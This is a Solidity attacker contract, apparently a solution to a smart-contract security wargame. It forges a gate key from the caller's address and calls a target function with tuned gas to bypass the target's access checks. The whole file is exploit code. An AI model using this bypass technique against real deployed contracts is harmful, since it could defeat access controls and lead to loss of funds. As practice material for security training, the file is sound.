pragma solidity ^0.8.0;

contract AttackerCorrectGas {
    address public immutable instance;

    constructor(address _instance) {
        instance = _instance;
    }

    function attack() public {
        uint16 yyyy = uint16(uint160(tx.origin)) & 0xFFFF;
        bytes8 gateKey = bytes8((uint64(0x00000001) << 32) | uint64(yyyy));
        (bool success,) = instance.call{gas: 819100}(
            abi.encodeWithSelector(
                0x822fd5f9, 
                gateKey
            )
        );
        require(success, "Call failed");
    }
}
